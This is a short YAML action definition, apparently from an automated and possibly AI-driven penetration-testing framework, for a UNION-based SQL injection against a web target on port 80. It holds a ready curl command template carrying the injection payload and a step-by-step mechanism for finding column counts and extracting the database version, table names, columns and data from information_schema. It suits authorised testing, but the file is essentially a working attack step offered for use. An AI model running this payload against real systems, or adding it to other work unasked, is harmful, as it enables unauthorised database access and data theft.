name: sqli_union
category: web
description: UNION-based SQL injection
preconditions:
  - service.port==80
parameters:
  target_ip: from_engagement.target_ip
command_template: "curl -s '{target_url}?id=1 UNION SELECT 1,2,3--'"
parser: null
expected_effects:
  - action_completed
falsifier:
  pattern: "error|failed|refused|denied"
  timeout: 30
model_tier: haiku
mechanism: "UNION SQLi: determine column count (ORDER BY N), find visible columns, extract: database(), version(), table_names from information_schema, columns, data."
